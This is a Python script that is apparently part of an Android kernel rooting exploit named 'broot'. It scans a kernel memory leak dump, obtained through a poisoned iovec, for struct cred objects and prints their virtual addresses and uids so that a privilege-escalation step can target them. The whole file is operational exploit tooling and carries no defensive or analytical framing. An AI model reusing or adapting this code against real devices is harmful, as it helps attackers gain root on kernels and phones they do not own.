#!/usr/bin/env python3
"""Scan a broot leak dump for struct cred candidates.

The leaked stream starts at the VA the tool prints as `S=` (see report_window in
tools/broot.c: the poisoned iovec base == slotVA + 0x50), so stream offset i maps to
VA S + i.  A cred is found by its most distinctive shape: uid,gid,suid,sgid,euid,egid,
fsuid,fsgid as eight equal u32 right after atomic usage -- apps and shell processes all
have that.  Kernel VAs and small cap words are used to reject coincidental matches.

usage: tools/credscan.py <dump-file> [--uid N]... [--base S]   (S from broot's window line)
"""
import argparse
import os
import re
import struct
import sys

LINEAR_LO = 0xFFFFFF8000000000
LINEAR_HI = 0xFFFFFFC080000000 + (1 << 34)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("dump")
    ap.add_argument("--uid", action="append", default=[])
    ap.add_argument("--base", default=None, help="stream-start VA (hex) reported by broot as S=")
    ap.add_argument("--auto", action="store_true", help="treat any 8-equal-u32 run as a hit regardless of uid")
    a = ap.parse_args()

    data = open(a.dump, "rb").read()
    base = int(a.base, 16) if a.base else None
    uids = [int(u, 0) for u in a.uid] or [2000, 0, 10132, 10022, 10028, 1000, 0]

    # find every 8-in-a-row equal u32 run, then apply cred-shape filters (a bare
    # 8-equal run is worthless: the leak's own zero-filled payload matches it)
    hits = []
    for i in range(4, len(data) - 68, 4):
        v = struct.unpack_from("<I", data, i)[0]
        if v > 0xFFFF:
            continue
        if not all(struct.unpack_from("<I", data, i + 4 * k)[0] == v for k in range(8)):
            continue
        usage = struct.unpack_from("<I", data, i - 4)[0]
        if not (0 < usage < 100000):
            continue
        if not a.auto and v not in uids:
            continue
        caps = struct.unpack_from("<8I", data, i + 32)
        okcap = all(x == 0 for x in caps) or (caps[2] == 0x3fffffff and caps[3] == 0xffffffff)
        if not okcap:
            continue
        ptrs = []
        for off in (0x4c, 0x50, 0x58, 0x60, 0x68, 0x70):
            c = struct.unpack_from("<Q", data, i - 4 + off)[0]
            if LINEAR_LO <= c < LINEAR_HI:
                ptrs.append((off, hex(c)))
        if not ptrs:
            continue
        hits.append((i, v, usage, caps, ptrs))

    print("# dump=%s size=%d base=%s  cred-shape hits=%d" %
          (os.path.basename(a.dump), len(data), hex(base) if base else "unknown", len(hits)))
    for i, v, usage, caps, ptrs in hits[:40]:
        va = (base + i) if base else None
        cred = (base + i - 4) if base else None
        print("  off=%-6d uid=%-6d usage=%-6d caps=%s ptrs=%s  uidVA=%s credVA=%s" % (
            i, v, usage, [hex(x) for x in caps[:4]], ptrs[:3],
            hex(va) if va else "?", hex(cred) if cred else "?"))
    if not hits:
        print("  no candidate: the cred_jar slab is not inside this window -- retake the leak")
    return 0


if __name__ == "__main__":
    sys.exit(main())
